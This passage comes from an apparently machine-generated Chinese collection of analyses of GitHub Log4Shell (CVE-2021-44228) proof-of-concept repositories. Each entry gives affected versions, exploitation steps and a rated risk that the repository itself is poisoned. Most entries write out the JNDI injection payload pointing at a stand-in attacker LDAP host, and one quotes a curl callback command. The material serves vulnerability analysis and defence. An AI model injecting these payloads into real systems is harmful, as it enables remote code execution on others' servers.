**来源**: [CVE-2021-44228-julian911015_Log4j-Scanner-Exploit.md](../2021/CVE-2021-44228-julian911015_Log4j-Scanner-Exploit.md)

## CVE-2021-44228-Apache Log4j2-JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3 和 2.3.1)

**利用条件:** 目标系统使用了受影响的 Log4j2 版本，且允许 message lookup substitution

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是 Apache Log4j2 中的一个严重漏洞，它允许攻击者通过 JNDI 注入执行远程代码。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 功能，从 LDAP 服务器加载恶意代码。 

**有效性：**
根据漏洞库信息和搜索结果，此漏洞是真实且已被广泛利用的。提供的 POC 代码尝试通过构造包含 JNDI 查找的恶意 payload，触发漏洞。

**投毒风险：**
代码主要功能是利用 Log4Shell 漏洞进行扫描和利用。虽然代码本身是为了利用漏洞，但存在一些潜在的风险，可能被恶意修改后进行投毒：

*   **Payload 修改：** 攻击者可以修改 payload，使其执行恶意操作，例如下载并执行其他恶意软件。
*   **LDAP 服务器：** 攻击者可能控制 LDAP 服务器，导致被攻击者下载恶意 payload。
*   **后门植入：** 攻击者可能会在扫描或利用过程中，通过漏洞在目标系统上植入后门，以便长期控制。

综合来看，代码本身具有一定的风险，需要谨慎使用。这里给出10%的投毒风险评估，因为代码的功能和目标较为明确，主要风险在于使用者可能被引导至恶意的LDAP服务器。

**利用方式：**

1.  **构建恶意 Payload：** 攻击者构造包含 JNDI 查找的字符串，例如 `${jndi:ldap://attacker.com/Exploit}`。
2.  **触发日志记录：** 将恶意 payload 注入到应用程序的日志消息中。这可以通过多种方式实现，例如通过 HTTP 请求头（User-Agent、X-Forwarded-For 等）、POST 请求参数或其他任何会被记录到日志中的输入。
3.  **JNDI 查找：** 当 Log4j2 尝试记录包含恶意 payload 的日志消息时，它会触发 JNDI 查找。
4.  **远程代码执行：** JNDI 查找会导致应用程序连接到攻击者控制的 LDAP 服务器，并下载和执行恶意代码。

提供的漏洞利用代码通过以下步骤尝试利用漏洞：

1.  **启动 LDAP 和 HTTP 服务器：** 使用 `JNDIExploit` 工具启动一个恶意的 LDAP 服务器，用于提供恶意 payload。同时启动一个 HTTP 服务器，用于托管 payload 文件。
2.  **扫描目标 URL：** 从指定的 URL 字典中读取 URL，并向这些 URL 发送包含恶意 payload 的 HTTP 请求。
3.  **注入 Payload 到 HTTP 头：** 将 payload 注入到 `X-Api-Version`、`User-Agent` 和 `X-Forwarded-For` 等常见的 HTTP 头中。
4.  **注入 Payload 到 URL 参数：** 将 payload 注入到 URL 参数中。

通过以上步骤，攻击者可以尝试触发目标应用程序的 Log4j2 漏洞，并执行远程代码。

**项目地址:** [julian911015/Log4j-Scanner-Exploit](https://github.com/julian911015/Log4j-Scanner-Exploit)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #27

**来源**: [CVE-2021-44228-khaidtraivch_CVE-2021-44228-Log4Shell-.md](../2021/CVE-2021-44228-khaidtraivch_CVE-2021-44228-Log4Shell-.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和完全系统控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响的 Log4j2 版本，并且允许消息查找替换功能（默认启用）。攻击者需要能够控制 Log4j2 记录的日志消息或参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又称 Log4Shell，是一个存在于 Apache Log4j2 中的远程代码执行漏洞。该漏洞源于 Log4j2 的 JNDI (Java Naming and Directory Interface) 功能，该功能允许在日志消息中执行 JNDI 查找。如果攻击者可以控制日志消息的内容，他们就可以注入恶意的 JNDI 查找字符串，从而导致 Log4j2 从攻击者控制的 LDAP 或其他 JNDI 服务加载并执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，CVE-2021-44228 是一个被广泛利用的严重漏洞。 搜索结果中提供了多个关于漏洞分析、缓解措施和利用的链接。虽然提供的漏洞利用代码仓库只包含一个 README.md 文件，信息很少。但考虑到CVE本身的严重性和公开性，判断存在有效的PoC。

**投毒风险：**
提供的漏洞利用代码仓库 `/tmp/b3e5418f03d45523b0a6001074bd0614/README.md` 只包含简单的描述信息 "CVE-2021-44228-Log4Shell-Kiểm thử xâm nhập" (越南语，意思是渗透测试)。**无法直接从该文件判断是否存在投毒代码。** 但从代码仓库的简洁程度来看，作者可能意图引导用户从其他渠道获取EXP，增加了恶意代码嵌入的可能性，**因此存在一定的投毒风险。风险评估为10%**。

**利用方式：**
漏洞利用的核心在于构造包含恶意 JNDI 查找的日志消息，例如：`${jndi:ldap://attacker.com/evil}`。当 Log4j2 记录包含此字符串的消息时，它会尝试连接到 `attacker.com` 上的 LDAP 服务器，并加载和执行从该服务器返回的 Java 代码。

**攻击步骤：**
1.  攻击者找到一个使用 Log4j2 的应用程序，该应用程序会将攻击者可控的数据记录到日志中。
2.  攻击者将包含恶意 JNDI 查找字符串的payload注入到应用程序的输入字段，例如 HTTP Header (User-Agent, X-Forwarded-For等等)、POST 参数、GET 参数或其他任何会被记录到日志中的数据。
3.  当应用程序记录包含该字符串的日志消息时，Log4j2 会尝试执行 JNDI 查找。
4.  如果应用程序配置允许，Log4j2 将连接到攻击者控制的 JNDI 服务器（例如 LDAP），并下载和执行恶意 Java 代码。

**缓解措施：**
*   升级 Log4j2 到 2.17.1 或更高版本。
*   如果无法升级，可以设置系统属性 `log4j2.formatMsgNoLookups=true` 或环境变量 `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`，以禁用消息查找替换功能。
*   删除 `JndiLookup` 类。

**项目地址:** [khaidtraivch/CVE-2021-44228-Log4Shell-](https://github.com/khaidtraivch/CVE-2021-44228-Log4Shell-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #28

**来源**: [CVE-2021-44228-mgueye3_Log4Shell.md](../2021/CVE-2021-44228-mgueye3_Log4Shell.md)

## CVE-2021-44228-Apache Log4j2-JNDI 注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI 注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用受影响的 Log4j2 版本，且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228 (Log4Shell) 漏洞存在于 Apache Log4j2 中，由于其 JNDI 功能未对攻击者控制的 LDAP 和其他 JNDI 相关端点进行保护。攻击者可以控制日志消息或日志消息参数，从而在启用消息查找替换时执行从 LDAP 服务器加载的任意代码。

**有效性：**
根据漏洞库信息和大量已公开的漏洞利用案例，此漏洞的利用是有效的。大量资料表明，该漏洞在野外被广泛利用。

**投毒风险：**
提供的漏洞利用代码是一个JSON文件，其中包含一组flag，这些flag很可能是CTF挑战或者渗透测试演练中的结果，而不是实际的漏洞利用代码。因此，可以认为不存在投毒代码。

**利用方式：**
1.  攻击者构造包含 JNDI 查找表达式的恶意字符串，例如 `${jndi:ldap://attacker.com/evil}`。
2.  目标应用程序使用存在漏洞的 Log4j2 版本记录此字符串。
3.  Log4j2 尝试解析 JNDI 查找表达式，并连接到攻击者控制的 LDAP 服务器（或 RMI、DNS 等）。
4.  LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，从而导致远程代码执行。

需要注意的是，从 Log4j 2.15.0 开始，此行为已默认禁用。在 2.16.0 版本（以及 2.12.2、2.12.3 和 2.3.1）中，此功能已完全删除。


**项目地址:** [mgueye3/Log4Shell](https://github.com/mgueye3/Log4Shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #29

**来源**: [CVE-2021-44228-michaelsanford_Log4Shell-Honeypot.md](../2021/CVE-2021-44228-michaelsanford_Log4Shell-Honeypot.md)

## CVE-2021-44228-Log4Shell-Honeypot

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和数据泄露

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用存在漏洞的Log4j2版本，且允许log message lookup substitution

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一种严重的远程代码执行 (RCE) 漏洞，存在于 Apache Log4j 2.0-beta9 到 2.15.0 版本（不包括安全版本 2.12.2、2.12.3 和 2.3.1）中。该漏洞源于 Log4j2 JNDI 功能在配置、日志消息和参数中，未能充分保护免受攻击者控制的 LDAP 和其他 JNDI 相关端点的攻击。

**利用方式：**

攻击者可以控制日志消息或日志消息参数，从而执行从 LDAP 服务器加载的任意代码。这是通过在日志消息中插入包含 JNDI 查找的恶意字符串来实现的，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j2 处理此日志消息时，它会尝试连接到攻击者控制的 LDAP 服务器，并执行服务器返回的恶意代码。

**有效性：**

根据漏洞库信息、搜索结果以及漏洞利用代码，可以判断该漏洞利用的POC代码有效。网上存在大量的利用该漏洞的POC，并且该漏洞已被广泛利用。

**投毒风险：**

提供的代码是Log4Shell Honeypot，目的是为了检测和防御Log4Shell攻击，而不是利用Log4Shell进行攻击。Dockerfile 构建了一个 Python 应用，用于模拟易受攻击的 Log4j2 环境，通过检测特定模式（例如 `${jndi:`）来识别潜在的攻击。主要目的是捕获攻击尝试的相关信息，例如攻击来源 IP 地址、攻击载荷等。尽管从技术角度讲，可以修改该 Honeypot 以包含恶意代码，但从代码的主要功能来看，其目的在于防御，而不是攻击。虽然整体投毒风险较低，但如果有人修改了 Honeypot 的代码，增加了反向shell或者其他恶意代码，那么投毒风险会增加。因此，给出10%的投毒风险评估。

总而言之，这是一个高危漏洞，攻击者可以利用它来远程执行代码。但是，提供的代码是一个honeypot，旨在检测此类攻击，虽然存在被修改后用作恶意用途的可能，但是可能性相对较低。

**项目地址:** [michaelsanford/Log4Shell-Honeypot](https://github.com/michaelsanford/Log4Shell-Honeypot)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #30

**来源**: [CVE-2021-44228-moften_Log4Shell.md](../2021/CVE-2021-44228-moften_Log4Shell.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包含安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响的Log4j2版本，并且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一个关键的远程代码执行漏洞，存在于 Apache Log4j 2.0-beta9 到 2.15.0 版本中 (不包括安全版本 2.12.2、2.12.3 和 2.3.1)。此漏洞源于 Log4j2 JNDI 功能在配置、日志消息和参数中，未能防止攻击者控制的 LDAP 和其他 JNDI 相关端点。 攻击者可以通过控制日志消息或日志消息参数，在启用消息查找替换时，执行从 LDAP 服务器加载的任意代码。

**有效性：**
根据漏洞描述和提供的PoC代码，该漏洞的利用是有效的。PoC 通过 JNDI 注入 LDAP URL 来触发漏洞，从而导致远程代码执行。

**投毒风险：**
该仓库的投毒风险评估为10%。虽然PoC本身旨在演示漏洞利用，但 `Exploit.java` 包含执行 `curl http://TU_IP:9999/pwned` 的指令，表明攻击者可以轻易地替换成更具破坏性的命令。`main.py`脚本本身看起来没有明显的恶意代码，但如果攻击者修改`Exploit.java` 并诱导用户使用，则存在风险。 README中包含了从github上克隆`marshalsec`的步骤，如果`marshalsec`库被投毒，也会导致风险。因此，需要仔细审查和验证。

**利用方式：**
1.  **确定目标：** 找到使用易受攻击的 Log4j2 版本的应用程序。
2.  **构造Payload：** 构造包含 JNDI 查找的恶意字符串。例如： `${jndi:ldap://attacker.com/Exploit}`。
3.  **触发日志记录：** 将 Payload 注入到应用程序将会记录的输入字段中，例如 HTTP Headers (User-Agent, Referer, X-Forwarded-For), POST 参数等。
4.  **恶意LDAP服务器：**设置一个恶意的LDAP服务器，当Log4j2尝试去lookup这个URL的时候，从HTTP服务器上获取恶意的Java Class文件并执行。
5.  **远程代码执行：** Log4j2 将连接到攻击者的 LDAP 服务器，检索并执行恶意 Java 代码，从而允许攻击者在目标系统上执行任意命令。

请注意，成功利用此漏洞需要目标应用程序启用消息查找替换，并且能够解析 JNDI 查找。较高版本的 Log4j 默认禁用了此功能，从而缓解了此漏洞。

**项目地址:** [moften/Log4Shell](https://github.com/moften/Log4Shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #31

**来源**: [CVE-2021-44228-mr-won_Log4shell.md](../2021/CVE-2021-44228-mr-won_Log4shell.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 🔥 치명적 (CVSS 10.0) - 远程代码执行，完全控制受影响系统

**影响版本:** 2.0-beta9 ~ 2.14.1

**利用条件:** 目标系统使用了存在漏洞的Log4j2版本，且允许Log4j2记录攻击者可控的输入（例如，HTTP请求头、用户输入等），消息lookup substitution is enabled

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j2中的远程代码执行漏洞。攻击者通过将恶意的JNDI lookup字符串（例如 `${jndi:ldap://attacker.com:1389/exploit}`）注入到Log4j2可以记录的任何输入中，即可触发该漏洞。

**有效性：**

提供的漏洞利用代码包含一个README.md文件，该文件描述了Log4Shell漏洞的原理、影响、利用方式、检测和缓解措施。其中包含一个利用示例 `${jndi:ldap://attacker.com:1389/exploit}`，表明该POC有效，可用于触发漏洞。

**利用方式：**

1.  攻击者构造包含恶意JNDI lookup字符串的Payload，例如 `${jndi:ldap://attacker.com:1389/exploit}`。
2.  攻击者将该Payload注入到应用程序可以记录的任何输入点，例如HTTP请求头（User-Agent，X-Forwarded-For等）、POST请求参数、Web表单字段等。
3.  应用程序使用Log4j2记录包含该Payload的日志条目。
4.  Log4j2在处理日志条目时，解析JNDI lookup字符串，并尝试连接到攻击者控制的LDAP服务器 `attacker.com:1389`。
5.  攻击者的LDAP服务器返回一个指向恶意Java类的URL。
6.  Log4j2下载并执行该恶意Java类，导致远程代码执行。

**投毒风险：**
该README.md 文件分析报告本身不包含恶意代码，但存在潜在的投毒风险，该风险主要来自用户在使用git clone 下载源码时，如果攻击者控制了welk仓库,或者使用docker build 从Dockerfile构建docker镜像时，攻击者可以在Dockerfile中植入恶意代码。因此，代码仓库或镜像来源不可信的情况下，可能存在潜在的风险。因此该仓库中存在投毒代码的可能性较低，但不能完全排除(10%).

**项目地址:** [mr-won/Log4shell](https://github.com/mr-won/Log4shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #32

**来源**: [CVE-2021-44228-qw3rtyou_CVE-2021-44228_dockernize.md](../2021/CVE-2021-44228-qw3rtyou_CVE-2021-44228_dockernize.md)

## CVE-2021-44228 (Log4Shell)

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的 Log4j2 版本，并且启用了消息查找替换功能。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也被称为Log4Shell，是一个严重的远程代码执行漏洞，存在于Apache Log4j2中。该漏洞源于Log4j2在配置、日志消息和参数中使用的JNDI功能没有对攻击者控制的LDAP和其他JNDI相关端点提供足够的保护。

**有效性：**

提供的POC代码有效。它设置了一个dockerized环境，包括一个易受攻击的Java应用程序和一个模拟攻击者的LDAP服务器和HTTP服务器。该POC演示了如何通过JNDI注入执行任意代码。

**投毒风险：**

评估该代码的投毒风险约为10%。主要考虑以下几点：

*   `attacker/Payload.java`: 包含反弹shell的代码，存在被恶意修改的可能。
*   `attacker/index.js`和`attacker/ldap-server.js`:  可能被修改为重定向或记录漏洞利用尝试，虽然不直接执行恶意代码，但可以收集信息。
*   虽然大部分代码的功能是明确的，但在`Payload.java`中嵌入更隐蔽的后门或数据收集行为是可能的。因此存在一定的投毒风险。

**利用方式：**

1.  攻击者向目标应用程序发送包含恶意JNDI查找字符串的请求。例如：`${jndi:ldap://attacker.com/Exploit}`。
2.  如果目标应用程序使用Log4j2记录该请求，它会尝试解析JNDI查找字符串。
3.  Log4j2通过JNDI连接到攻击者控制的LDAP服务器 (attacker.com)。
4.  LDAP服务器返回一个包含指向攻击者控制的HTTP服务器的Java类的引用。
5.  Log4j2从HTTP服务器下载并执行该Java类，从而允许攻击者在目标系统上执行任意代码。

**缓解措施：**

*   升级到Log4j 2.17.1 或更高版本（此版本完全移除了有问题的 JNDI 功能）。
*   在旧版本中，设置`log4j2.formatMsgNoLookups=true` 或移除`JndiLookup` 类。

**项目地址:** [qw3rtyou/CVE-2021-44228_dockernize](https://github.com/qw3rtyou/CVE-2021-44228_dockernize)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #33

**来源**: [CVE-2021-44228-redhuntlabs_Log4JHunt.md](../2021/CVE-2021-44228-redhuntlabs_Log4JHunt.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell 漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2，并且允许 message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j2中的高危远程代码执行漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 注入，从 LDAP 服务器加载并执行任意代码。  

**有效性：** 根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码（Log4JHunt），该漏洞是有效的，并且在野外被广泛利用。Log4JHunt工具旨在自动化检测Log4Shell漏洞。

**投毒风险：**  提供的漏洞利用代码仓库 (Log4JHunt) 主要是一个扫描器，用于检测 Log4Shell 漏洞。通过人工分析代码，发现代码本身存在后门的概率较低。但用户使用第三方工具，仍然存在一定的风险。

仓库中可能存在的潜在风险点：

*   **依赖风险:** 该工具依赖于第三方库，这些库可能存在未知的漏洞或被恶意篡改。但这种风险是普遍存在的，并非该仓库特有。
*   **配置错误风险:** 用户可能配置不当，例如将扫描结果泄露到公共渠道，或者使用弱口令的 DNS callback server，导致信息泄露或被恶意利用。
*   **恶意作者风险：** 作者可能在未来的版本中植入恶意代码，但目前没有证据表明存在这种情况。

综合考虑，此仓库的投毒风险较低，大约为10%。

**利用方式：**

1.  攻击者向目标系统发送包含恶意 JNDI 查找字符串的请求。例如：`${jndi:ldap://attacker.com/evil}`。
2.  如果目标系统使用受影响的 Log4j2 版本记录该请求，Log4j2 会尝试解析 JNDI 查找字符串。
3.  Log4j2 通过 JNDI 接口连接到攻击者控制的 LDAP 服务器 (attacker.com)。
4.  LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，导致远程代码执行。

**Log4JHunt 工具的使用方式：**

1.  使用 Log4JHunt 扫描目标系统，可以指定单个 URL 或包含 URL 列表的文件。
2.  Log4JHunt 会向目标系统发送包含恶意 JNDI 查找字符串的请求，并监控 DNS callback server 或 Canarytokens 服务，以判断目标系统是否存在漏洞。
3.  如果目标系统存在漏洞，Log4JHunt 会收到 DNS callback 或 Canarytokens 触发的通知。

**项目地址:** [redhuntlabs/Log4JHunt](https://github.com/redhuntlabs/Log4JHunt)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #34

**来源**: [CVE-2021-44228-safeer-accuknox_log4j-shell-poc.md](../2021/CVE-2021-44228-safeer-accuknox_log4j-shell-poc.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 to 2.15.0 (不包含 security releases 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标应用使用了存在漏洞的Log4j2版本，并且启用了message lookup substitution功能，攻击者能够控制日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j 2中的高危远程代码执行漏洞。该漏洞源于Log4j2的JNDI功能，当message lookup substitution功能启用时，攻击者可以通过控制日志消息或日志消息参数，利用JNDI注入，从恶意的LDAP服务器加载并执行任意代码。

**POC有效性：**

根据提供的docker-compose.yaml文件和Dockerfile文件，该POC的目的是创建一个易受攻击的Log4j2 Web应用程序和一个攻击服务器。attack-server 搭建了一个恶意的JNDI服务，用于向目标应用返回恶意payload，实现远程代码执行。

vulnerable-application 使用了tomcat 镜像，部署了 log4shell.war 包，模拟存在漏洞的web应用。

所以POC代码是有效的。

**投毒风险：**

考虑到以下几点，投毒风险评估为10%：

*   **来源可疑：** 漏洞利用代码来自GitHub上公开的JNDI-Exploit-Kit 和 log4j-shell-poc仓库，并说明了原始repository。
*   **简单的命令执行:** JNDI-Exploit-Kit 的Dockerfile中，通过 `-C` 参数执行 curl 命令，如果攻击服务器被篡改或者受到中间人攻击，可能导致执行的命令被替换为恶意代码。
*   **网络依赖：** 该POC依赖于网络连接，如果攻击者可以控制网络流量，可能会劫持请求并注入恶意代码。

虽然存在风险，但是代码的目的相对明确,只是执行`curl` 命令，且给出了原始仓库地址，因此不认为主要目的是投毒，但存在被利用的可能性。

**利用方式：**

1.  攻击者向目标应用程序发送包含恶意JNDI lookup字符串的请求，例如：`${jndi:ldap://attacker.com/evil}`。
2.  目标应用程序使用Log4j2记录该请求，触发JNDI lookup。
3.  Log4j2通过JNDI向`attacker.com`的LDAP服务器发起请求。
4.  攻击者的LDAP服务器返回一个包含恶意Java类的JNDI引用。
5.  Log4j2加载并执行该恶意Java类，从而实现远程代码执行。

总结：该漏洞利用简单，危害巨大。POC的有效性高，但存在一定的投毒风险。

**项目地址:** [safeer-accuknox/log4j-shell-poc](https://github.com/safeer-accuknox/log4j-shell-poc)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #35

**来源**: [CVE-2021-44228-sec13b_CVE-2021-44228-POC.md](../2021/CVE-2021-44228-sec13b_CVE-2021-44228-POC.md)

## CVE-2021-44228-Log4Shell-RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可导致服务器完全控制

**影响版本:** <= 2.14.1 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用存在漏洞的Log4j2版本，且允许攻击者控制日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是一个严重的远程代码执行漏洞，存在于Apache Log4j2中。攻击者可以通过构造特殊的JNDI注入字符串，例如`${jndi:ldap://attacker.com/evil}`，当Log4j2记录此字符串时，会尝试通过JNDI从攻击者控制的LDAP服务器下载并执行恶意代码。这个漏洞利用的关键在于Log4j2的lookup substitution功能允许在日志消息中使用JNDI查找。漏洞库信息、搜索引擎结果和提供的PoC代码都证实了此漏洞的严重性和利用方式。

**有效性：**
提供的YAML格式的PoC代码有效，针对不同的应用场景（Apache Druid, Apache JSPWiki, CAS, Code42, Elasticsearch等）构造了特定的payload，通过发送包含JNDI注入字符串的请求，触发漏洞。

**投毒风险：**
PoC代码本身的主要目的是验证漏洞的存在，但存在一定的投毒风险。虽然PoC中执行的恶意代码通常是用于验证目的，例如回连攻击者的服务器，但如果攻击者篡改这些PoC，可以将payload替换为更具破坏性的恶意代码，比如植入后门、窃取敏感信息或进行拒绝服务攻击。由于PoC文件来自未经审核的第三方源，存在作者在payload中植入恶意代码的可能性。因此，在使用这些PoC时，需要仔细审查代码，确保其安全性。

风险评估：
* 代码结构和目标：PoC文件结构清晰，目标明确，针对已知漏洞利用。恶意行为的风险较低，因为代码的目的是为了复现漏洞，而不是隐藏恶意功能。
* 外部依赖：几乎没有外部依赖项，降低了引入恶意代码的可能性。
* 权限要求：这些 PoC 需要具有执行网络请求的权限，这增加了潜在的风险，因为它们可能被用来发起对内部网络的攻击或数据泄露。
* 代码审查：代码可读性高，易于审查。这意味着可以相对容易地识别和删除任何潜在的恶意代码。

综合以上因素，我给出的投毒风险是 10%。

**利用方式：**
1.  **确定目标系统：** 找到使用存在漏洞的Log4j2版本的应用程序。
2.  **构造恶意Payload：**  构建包含JNDI注入的Payload，例如`${jndi:ldap://attacker.com/evil}`。其中`attacker.com`是攻击者控制的服务器，`evil`是LDAP服务器上的恶意代码。
3.  **发送Payload：** 将Payload插入到应用程序的日志消息中。这可以通过多种方式实现，例如：
    *   HTTP请求头（User-Agent, X-Forwarded-For等）
    *   POST请求参数
    *   URL参数
    *   任何可能被应用程序记录的输入
4.  **利用JNDI执行恶意代码：**  当Log4j2记录包含Payload的消息时，会尝试通过JNDI从`attacker.com`下载并执行恶意代码。
5.  **反向shell获取权限：**  恶意代码通常会启动一个反向shell，允许攻击者远程控制目标系统。

提供的PoC代码针对特定应用（Druid, JSPWiki, CAS, Code42, Elasticsearch）的特定URI或HTTP头构造包含恶意JNDI字符串的请求，如果目标应用存在漏洞，且使用Log4j2记录相关请求信息，则可触发漏洞，实现远程代码执行。

**项目地址:** [sec13b/CVE-2021-44228-POC](https://github.com/sec13b/CVE-2021-44228-POC)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #36

**来源**: [CVE-2021-44228-srcporter_CVE-2021-44228.md](../2021/CVE-2021-44228-srcporter_CVE-2021-44228.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 需要目标系统使用受影响版本的 Log4j2，且允许 JNDI 查找

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 漏洞存在于 Apache Log4j2 中，由于 JNDI 功能未对攻击者控制的 LDAP 和其他 JNDI 相关端点进行保护。攻击者可以通过控制日志消息或日志消息参数，在启用了消息查找替换的情况下，执行从 LDAP 服务器加载的任意代码。

**有效性：** 根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，该漏洞是有效的。 搜索引擎结果显示了许多关于此漏洞的分析、利用和缓解措施的讨论。提供的 Dockerfile 和构建脚本表明可以构建一个包含漏洞的应用程序。

**利用方式：**

1.  攻击者将恶意 JNDI 查找字符串注入到应用程序的日志消息中。例如，通过 HTTP 请求的 User-Agent 头部或 POST 请求的参数。
2.  Log4j2 尝试解析日志消息，遇到 JNDI 查找字符串，例如 `${jndi:ldap://attacker.com/evil}`。
3.  Log4j2 通过 JNDI 连接到攻击者控制的 LDAP 服务器 (attacker.com)。
4.  LDAP 服务器返回一个包含恶意 Java 类的 URL。
5.  Log4j2 下载并执行该恶意 Java 类，从而导致远程代码执行。

**投毒风险：**提供的代码库旨在创建一个包含 Log4Shell 漏洞的示例应用程序，用于安全测试。虽然代码本身直接显示了漏洞的存在，但仍然存在一些轻微的投毒风险，主要集中在以下几点：

*   **依赖项混淆:** 恶意修改`pom.xml`或其他构建脚本,引入包含恶意代码的其他依赖项。
*   **构建脚本后门:** 在`build.sh`或Dockerfile中添加额外的命令,在构建过程中植入后门。
*   **ClassLoader Manipulation:** 理论上，可以修改应用程序的类加载器，动态加载和执行恶意代码，但这需要对Java内部机制有深入的了解，并且更难检测。
    
    考虑到这些风险，我认为此代码库存在约10%的投毒风险，因为即使是示例代码也可能被用于传播恶意负载。

**项目地址:** [srcporter/CVE-2021-44228](https://github.com/srcporter/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #37

**来源**: [CVE-2021-44228-tadash10_Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment.md](../2021/CVE-2021-44228-tadash10_Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell 远程代码执行漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行、数据泄露和服务器完全控制

